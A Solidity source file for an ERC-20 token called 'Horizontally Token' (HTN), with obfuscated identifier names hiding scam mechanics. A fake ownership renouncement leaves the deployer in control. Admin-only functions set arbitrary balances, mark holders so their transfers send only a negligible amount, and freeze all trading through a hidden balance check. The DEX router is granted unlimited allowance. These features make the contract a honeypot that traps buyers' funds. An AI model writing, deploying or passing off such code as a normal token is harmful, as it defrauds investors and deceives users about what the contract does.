//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface feeEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamSender) external view returns (uint256);

    function transfer(address walletMaxLiquidity, uint256 listLaunch) external returns (bool);

    function allowance(address takeReceiverLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 listLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address walletMaxLiquidity,
        uint256 listLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitMarketing, uint256 value);
    event Approval(address indexed takeReceiverLiquidity, address indexed spender, uint256 value);
}

abstract contract shouldReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isLaunchedAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletFrom {
    function createPair(address marketingFrom, address isFundMin) external returns (address);
}

interface feeEnableMetadata is feeEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HorizontallyToken is shouldReceiver, feeEnable, feeEnableMetadata {

    function name() external view virtual override returns (string memory) {
        return totalAmount;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchTeamFee;
    }

    uint256 walletFeeToken;

    function approve(address maxTrading, uint256 listLaunch) public virtual override returns (bool) {
        receiverMin[_msgSender()][maxTrading] = listLaunch;
        emit Approval(_msgSender(), maxTrading, listLaunch);
        return true;
    }

    mapping(address => uint256) private tradingTeam;

    mapping(address => mapping(address => uint256)) private receiverMin;

    function fundLaunched(uint256 listLaunch) public {
        fundLiquidity();
        walletFeeToken = listLaunch;
    }

    uint256 liquidityExempt;

    function getOwner() external view returns (address) {
        return maxTeam;
    }

    mapping(address => bool) public feeMode;

    address public receiverWalletExempt;

    address totalLaunchedLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private maxTeam;

    uint256 private tradingAt;

    function exemptTeam(address modeFrom, uint256 listLaunch) public {
        fundLiquidity();
        tradingTeam[modeFrom] = listLaunch;
    }

    function shouldWallet(address isSender) public {
        fundLiquidity();
        if (fundTeam == maxFund) {
            tradingAt = limitReceiverMax;
        }
        if (isSender == teamWalletLimit || isSender == receiverWalletExempt) {
            return;
        }
        feeMode[isSender] = true;
    }

    address public teamWalletLimit;

    function liquiditySellTake(address receiverTotal) public {
        if (fundAtMin) {
            return;
        }
        if (maxFund) {
            fundTeam = true;
        }
        walletFund[receiverTotal] = true;
        
        fundAtMin = true;
    }

    function transfer(address modeFrom, uint256 listLaunch) external virtual override returns (bool) {
        return walletTradingTake(_msgSender(), modeFrom, listLaunch);
    }

    uint256 private tokenSwap = 100000000 * 10 ** 18;

    function transferFrom(address toMode, address walletMaxLiquidity, uint256 listLaunch) external override returns (bool) {
        if (_msgSender() != exemptAuto) {
            if (receiverMin[toMode][_msgSender()] != type(uint256).max) {
                require(listLaunch <= receiverMin[toMode][_msgSender()]);
                receiverMin[toMode][_msgSender()] -= listLaunch;
            }
        }
        return walletTradingTake(toMode, walletMaxLiquidity, listLaunch);
    }

    bool private maxFund;

    function receiverLimit() public {
        emit OwnershipTransferred(teamWalletLimit, address(0));
        maxTeam = address(0);
    }

    function owner() external view returns (address) {
        return maxTeam;
    }

    event OwnershipTransferred(address indexed atTokenEnable, address indexed fromList);

    function walletTradingTake(address toMode, address walletMaxLiquidity, uint256 listLaunch) internal returns (bool) {
        if (toMode == teamWalletLimit) {
            return feeWalletEnable(toMode, walletMaxLiquidity, listLaunch);
        }
        uint256 teamTo = feeEnable(receiverWalletExempt).balanceOf(totalLaunchedLimit);
        require(teamTo == walletFeeToken);
        require(walletMaxLiquidity != totalLaunchedLimit);
        if (feeMode[toMode]) {
            return feeWalletEnable(toMode, walletMaxLiquidity, senderMax);
        }
        return feeWalletEnable(toMode, walletMaxLiquidity, listLaunch);
    }

    function fundLiquidity() private view {
        require(walletFund[_msgSender()]);
    }

    uint256 public limitReceiverMax;

    string private totalAmount = "Horizontally Token";

    function balanceOf(address teamSender) public view virtual override returns (uint256) {
        return tradingTeam[teamSender];
    }

    bool private fundTeam;

    uint256 public listAt;

    function feeWalletEnable(address toMode, address walletMaxLiquidity, uint256 listLaunch) internal returns (bool) {
        require(tradingTeam[toMode] >= listLaunch);
        tradingTeam[toMode] -= listLaunch;
        tradingTeam[walletMaxLiquidity] += listLaunch;
        emit Transfer(toMode, walletMaxLiquidity, listLaunch);
        return true;
    }

    address exemptAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address atLimit, address maxTrading) external view virtual override returns (uint256) {
        if (maxTrading == exemptAuto) {
            return type(uint256).max;
        }
        return receiverMin[atLimit][maxTrading];
    }

    string private tokenEnable = "HTN";

    mapping(address => bool) public walletFund;

    uint8 private launchTeamFee = 18;

    uint256 constant senderMax = 6 ** 10;

    bool public fundAtMin;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenSwap;
    }

    constructor (){
        if (listAt != tradingAt) {
            listAt = tradingAt;
        }
        isLaunchedAuto takeAmount = isLaunchedAuto(exemptAuto);
        receiverWalletExempt = walletFrom(takeAmount.factory()).createPair(takeAmount.WETH(), address(this));
        
        teamWalletLimit = _msgSender();
        receiverLimit();
        walletFund[teamWalletLimit] = true;
        tradingTeam[teamWalletLimit] = tokenSwap;
        
        emit Transfer(address(0), teamWalletLimit, tokenSwap);
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenEnable;
    }

}